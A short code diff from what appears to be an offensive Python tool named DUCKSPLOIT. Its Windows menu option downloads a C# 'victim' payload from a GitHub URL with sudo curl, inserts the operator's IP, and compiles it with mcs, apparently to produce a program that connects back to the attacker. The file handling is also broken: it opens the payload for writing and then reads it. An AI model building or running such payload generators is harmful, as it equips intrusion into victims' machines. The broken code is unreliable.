@@ -122,15 +122,19 @@ while True:
             menu2 = input(Fore.GREEN + "Choose option [" + Fore.YELLOW + "1" + Fore.RED + "," + Fore.YELLOW + "2" + Fore.RED + "," + Fore.YELLOW + "3" + Fore.RED + "," + Fore.YELLOW + "4" + Fore.RED + Fore.GREEN + "]: ")
             if menu2 == "1":
                 os.system("clear")
-                print(Fore.YELLOW + "[o] csc v3.5 is installed")
+                print(Fore.YELLOW + "[o] mono is installed")
                 print("")
                 myip = input(Fore.GREEN + "Enter your ip (ipv4, ipv6 or dns server link allowed): ")
+                os.system("sudo rm -rf /tmp/payload.cs && sudo curl https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/victim/windows/program.cs -o /tmp/payload.cs")
+                file = open("/tmp/payload.cs", "w")
+                file.write(file.read().replace("<yourip>", myip))
+                os.system("sudo mcs /tmp/payload.cs")
             elif menu2 == "2":
                 os.system("clear")
-                print("linuxxx")
+                print("soon...")
             elif menu2 == "3":
                 os.system("clear")
-                print("androiidd")
+                print("soon...")
             elif menu2 == "4":
                 os.system("clear")
                 break
